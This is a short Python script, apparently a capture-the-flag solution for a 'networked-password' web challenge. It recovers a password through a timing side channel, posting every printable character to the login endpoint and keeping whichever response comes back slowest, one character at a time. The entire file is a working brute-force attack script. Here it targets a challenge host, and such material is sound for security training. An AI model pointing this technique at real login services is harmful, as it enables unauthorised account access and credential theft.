import requests
import time


data = ""
ans_str = 'a'
while(ans_str != '}'):
    time_final = 0
    for i in range(33,127):
        try_string = data + chr(i)
        URL = "https://networked-password.web.chal.hsctf.com"
        PASSWORD = {"password":"{}".format(try_string)}
        start = time.time()
        response = requests.post(url = URL,data=PASSWORD)
        time_now = time.time() - start
        if time_now > time_final and i!=33:
            time_final = time_now
            ans_str = chr(i)
    data += ans_str
    print data
       
#response = requests.post('https://networked-password.web.chal.hsctf.com',data="password=hsct")
#print response.elapsed.total_seconds()
